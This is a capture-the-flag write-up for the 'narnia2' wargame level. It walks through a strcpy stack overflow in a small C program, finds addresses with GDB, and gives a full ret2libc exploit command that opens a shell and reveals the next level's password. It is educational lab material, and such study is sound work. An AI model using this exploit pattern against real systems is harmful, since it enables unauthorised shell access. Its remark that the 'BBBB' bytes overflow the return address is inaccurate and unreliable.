# narnia2
slopey112 - 3/5/19

Taking a look at the binary, we can see it simply spits back whatever we feed it.
```
narnia2@narnia:/narnia$ ./narnia2 asdf
asdfnarnia2@narnia:/narnia$
```
Let's take a look at the source code to determine what we can exploit.
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
The code is very short, but long enough for a prominent bug to be found: the vulnerable `strcpy()`. The problem isn't the command itself, but it's usage right now; `buf` is only 128 bytes, and if `argv[1]` is greater than that, we get a stack overflow error. The mistake that was made in this program was that there was no check to see how big `argv[1]` is. Therefore, we can exploit this program.

However, that leads to another question in it of itself. How can we exploit this program when there is absolutely nothing to exploit?

Turns out, we can use an attack known as "return to libc", or "ret2libc" for short. The idea is to overflow the return address of a function, such that when return is called, instead of jumping to where it is suppose to go, we can instead hijack it to jump to a libc function like `system`.

That's the concept we'll employ here. We'll pull out GDB, and let's figure out where everything is. We already know that the offset should be 132, because 128 bytes from the buffer, plus 4 from the saved ebp. Therefore, all we need to know is where `system` is stored and where `/bin/sh` is stored.

GDB let's us do that very easily. There's a handy print command that let's us do just that.
```
(gdb) b *main
Breakpoint 1 at 0x804844b
(gdb) r
Starting program: /narnia/narnia2

Breakpoint 1, 0x0804844b in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
```
Okay, so `system` is stored at `0xf7e4c850`. What about `/bin/sh`?
```
(gdb) find 0xf7e4c850, +99999999, "/bin/sh"
0xf7f6ecc8
warning: Unable to access 16000 bytes of target memory at 0xf7fc8a50, halting search.
1 pattern found.
(gdb) x/s 0xf7f6ecc8
0xf7f6ecc8:	"/bin/sh"
```
That's easy as well. Let's put it all together.
```
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A'*132+'\x50\xc8\xe4\xf7'+'BBBB'+'\xc8\xec\xf6\xf7'")
$ cat /etc/narnia_pass/narnia3
vaequeezee
```
Note the 4 bytes of B. These are used to overflow the return address.
